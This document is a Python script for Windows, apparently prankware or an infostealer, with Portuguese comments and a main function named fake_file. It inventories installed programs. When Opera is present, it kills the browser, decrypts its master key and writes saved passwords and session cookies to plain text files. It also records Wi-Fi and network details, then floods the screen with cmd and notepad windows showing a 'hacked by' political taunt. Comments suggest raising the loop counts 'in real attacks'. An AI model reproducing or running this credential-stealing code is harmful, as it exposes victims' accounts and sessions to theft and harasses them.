import subprocess
import time
import os
import pywifi
from pywifi import const
import winreg
import json
import base64
import sqlite3
import shutil
import win32crypt
from datetime import datetime, timedelta
from Crypto.Cipher import AES




def fake_file():
    # PARTE 1
    ## 1.1 COMANDOs DE PROCURA E HACKING DE APPS
    def listar_todos_programas():
        programas = set()

        # 1. REGISTRO DO WINDOWS
        caminhos_registro = [
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
        ]
        for raiz, caminho in caminhos_registro:
            try:
                chave = winreg.OpenKey(raiz, caminho)
            except FileNotFoundError:
                continue
            for i in range(0, winreg.QueryInfoKey(chave)[0]):
                try:
                    subchave_nome = winreg.EnumKey(chave, i)
                    subchave = winreg.OpenKey(chave, subchave_nome)
                    nome = winreg.QueryValueEx(subchave, "DisplayName")[0]
                    try:
                        versao = winreg.QueryValueEx(subchave, "DisplayVersion")[0]
                    except FileNotFoundError:
                        versao = "?"
                    programas.add(f"{nome} - {versao}")
                except (FileNotFoundError, OSError):
                    continue

        # 2. PASTAS COMUNS DE INSTALAÇÃO
        caminhos_pastas = [
            r"C:\Program Files",
            r"C:\Program Files (x86)",
            os.path.expandvars(r"%LOCALAPPDATA%\Programs"),
            os.path.expandvars(r"%USERPROFILE%\AppData\Local"),
            os.path.expandvars(r"%USERPROFILE%\AppData\Roaming")
        ]
        for caminho in caminhos_pastas:
            if os.path.exists(caminho):
                for item in os.listdir(caminho):
                    full_path = os.path.join(caminho, item)
                    if os.path.isdir(full_path):
                        programas.add(item)

        return sorted(programas)
    programas = listar_todos_programas()
    
    # Salva todos os apps em apps_installed.txt e verifica navegadores específicos para hacking
    with open("apps_installed.txt", "a", encoding="utf-8") as f:
        for programa in programas:
            f.write(programa + "\n")
    with open("apps_installed.txt", "r", encoding="utf-8") as f:
        conteudo = f.read().lower()  
    
    # Opera
    if "opera" in conteudo:
        os.system("taskkill /F /IM opera.exe")
        def fake_file_websites():
            os.system("taskkill /F /IM opera.exe")

            # SENHAS
            def opera_gx_senha():
                local_state_path = os.path.join(os.environ['APPDATA'], r'Opera Software\Opera GX Stable\Local State')
                with open(local_state_path, 'r', encoding='utf-8') as file:
                    local_state = json.load(file)
                
                encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                encrypted_key = encrypted_key[5:]  # Remove "DPAPI" prefix
                key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                return key
            def descriptografar(buff, key):
                try:
                    if buff.startswith(b'v10') or buff.startswith(b'v11'):
                        iv = buff[3:15]
                        payload = buff[15:]
                        cipher = AES.new(key, AES.MODE_GCM, iv)
                        decrypted = cipher.decrypt(payload)[:-16]
                        return decrypted.decode()
                    else:
                        return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
                except Exception as e:
                    return f"Erro ao descriptografar: {e}"
            def dados_de_login():
                db_path = os.path.join(os.environ['APPDATA'], r'Opera Software\Opera GX Stable\Login Data')
                filename = "OperaData.db"
                shutil.copyfile(db_path, filename)
                db = sqlite3.connect(filename)
                cursor = db.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
                key = opera_gx_senha()
                for row in cursor.fetchall():
                    url = row[0]
                    username = row[1]
                    encrypted_password = row[2]
                    date_created = row[3]
                    password = descriptografar(encrypted_password, key)
                    if username or password:
                        with open("senhas.txt", "a", encoding="utf-8", errors="replace") as f:
                            f.write(f"Site: {url}")
                            f.write(f"Usuário: {username}")
                            f.write(f"Senha: {password}")
                            if date_created:
                                f.write(f"Criado em: {datetime(1601, 1, 1) + timedelta(microseconds=date_created)}")
                            f.write("="*50)
                cursor.close()
                db.close()
                os.remove(filename)
            
            # COOKIES
            def get_encryption_key(local_state_path):
                with open(local_state_path, "r", encoding="utf-8") as f:
                    local_state = json.load(f)
                encrypted_key = local_state["os_crypt"]["encrypted_key"]
                encrypted_key = base64.b64decode(encrypted_key)
                # Remove prefix "DPAPI"
                encrypted_key = encrypted_key[5:]
                key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                return key
            def decrypt_cookie(encrypted_value, key):
                try:
                    if encrypted_value[:3] == b'v10':

                        iv = encrypted_value[3:15]
                        payload = encrypted_value[15:-16]
                        tag = encrypted_value[-16:]
                        cipher = AES.new(key, AES.MODE_GCM, iv)
                        decrypted = cipher.decrypt_and_verify(payload, tag)
                    else:
                        # DPAPI
                        decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]

                    try:
                        return decrypted.decode('utf-8')
                    except UnicodeDecodeError:

                        return base64.b64encode(decrypted).decode('utf-8')
                except Exception as e:
                    return f"[Erro ao descriptografar]: {e}"
            def main():
                opera_paths = [
                    os.path.expandvars(r'%APPDATA%\Opera Software\Opera Stable'),
                    os.path.expandvars(r'%APPDATA%\Opera Software\Opera GX Stable')
                ]
                cookies_path = None
                local_state_path = None
                for path in opera_paths:
                    if os.path.exists(os.path.join(path, "Network", "Cookies")):
                        cookies_path = os.path.join(path, "Network", "Cookies")
                        local_state_path = os.path.join(path, "Local State")
                        break
                if not cookies_path or not local_state_path:
                    print("❌ Arquivo de cookies do Opera não encontrado.")
                    return
                key = get_encryption_key(local_state_path)
                temp_cookie_file = "Cookies_temp"
                shutil.copy2(cookies_path, temp_cookie_file)
                conn = sqlite3.connect(temp_cookie_file)
                cursor = conn.cursor()
                # Usa hex para evitar erro de UTF-8
                cursor.execute("SELECT host_key, name, hex(encrypted_value) FROM cookies")
                for host_key, name, hex_encrypted_value in cursor.fetchall():
                    try:
                        encrypted_value = bytes.fromhex(hex_encrypted_value)
                        decrypted_value = decrypt_cookie(encrypted_value, key)
                    except Exception as e:
                        decrypted_value = f"ERRO AO DESCRIPTOGRAFAR: {e}"

                    try:
                        with open("cookies.txt", "a", encoding="utf-8", errors="replace") as f:
                            f.write(f"Site: {host_key} | Cookie: {name} = {decrypted_value}\n")
                    except Exception as e:
                        print(f"Erro ao escrever cookie de {host_key}: {e}")

                cursor.close()
                conn.close()
                os.remove(temp_cookie_file)
            dados_de_login()
            main()
        fake_file_websites()

    # Chrome
    if "chrome" in conteudo:
        pass

    ## 1.2 COMANDOS DE REDE INTERNET E FUTURO HACKING
    ### CASO INTERNET VIA WIFI
    def escanear_wifi():

        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]  # Usa a primeira interface Wi-Fi
        iface.scan()             # Inicia o escaneamento
        time.sleep(3)            # Espera o scan terminar
        redes = iface.scan_results()
        with open("wifi.txt", "a", encoding="utf-8") as f:
            for i, rede in enumerate(redes):
                f.write(f"{i+1}. SSID: {rede.ssid} | Sinal: {rede.signal}\n")
    
    ### Checa se wifi ou ethernet
    try:
        wifi_info = subprocess.check_output("netsh wlan show interfaces", shell=True, text=True).strip()
        if "SSID" in wifi_info:
            escanear_wifi()
            with open("wifi.txt", "a", encoding="utf-8") as f:
                f.write(f"\n\n\n{wifi_info}")
        else:
            raise Exception("Sem conexão Wi-Fi.")
    except subprocess.CalledProcessError:
        ethernet_info = subprocess.check_output("ipconfig /all", shell=True, text=True).strip()
        with open("wifi.txt", "a", encoding="utf-8") as f:
            f.write(ethernet_info)
    


    ## 2 ATAQUES
    ### Criar e mostrar o 1 aviso de hacking (cmd)
    for x in range(5): # MUDAR PARA MAIS EM ATAQUES REAIS
        os.system(f'start cmd /k "echo LULA LADRÃO  https://x.com/estte7end ROUBOU O https://x.com/estte7end MEU CORAÇÃO https://x.com/estte7end"')
        time.sleep(1)
    time.sleep(2)

    ### Criar e mostrar o 2 aviso de hacking (notas)
    with open("HACKEDBY.txt", "a", encoding="utf-8") as f:
        for x in range (10):
            f.write("\nLULA LADRÃO  https://x.com/estte7end ROUBOU O https://x.com/estte7end MEU CORAÇÃO https://x.com/estte7end\n")
    for x in range(5): #MUDAR PARA MAIS NÚMEROS EM ATAQUE REAL
        os.startfile("HACKEDBY.txt")
        time.sleep(1)
        os.system("taskkill /f /im notepad.exe")
 


    ## 3 TERMINAR ATAQUE MOSTRANDO INFORMAÇÕES
    arquivos_gerais = ["wifi.txt", "apps_installed.txt"]
    with open("arquivos_gerais.txt", "a", encoding="utf-8") as f_saida:
        f_saida.write("SEUS DADOS HS:")
        for nome_arquivo in arquivos_gerais:
            if os.path.exists(nome_arquivo):
                f_saida.write(f"\n=== Conteúdo de: {nome_arquivo} ===\n")
                with open(nome_arquivo, "r", encoding="utf-8") as f_entrada:
                    f_saida.write(f_entrada.read())
                    f_saida.write("\n")
    os.startfile("arquivos_gerais.txt")

if __name__ == "__main__":
    fake_file()
